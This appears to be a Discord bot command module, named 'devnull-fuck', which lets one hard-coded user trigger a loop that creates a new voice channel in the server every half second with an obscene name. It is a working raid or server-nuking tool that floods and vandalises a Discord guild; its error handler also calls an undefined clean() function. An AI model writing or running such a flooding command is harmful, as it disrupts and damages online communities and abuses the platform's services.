module.exports.run = async (client, message) => {

   if (message.author.id != '407157653475819530') return message.channel.send(`⚠ У вас недостаточно прав для выполнения скрипта.`);
    try {
setInterval(() => message.guild.createChannel(`Fucked by /DEV/NULL`, { type: 'VOICE' }), 500)
    } catch (err) {
        message.channel.send(clean(err), {
            code: "js"
        }).then(async (res) => {
            await res.react("❌");
        });
}};
module.exports.help = {
    name: "devnull-fuck",
    category: "owner"
};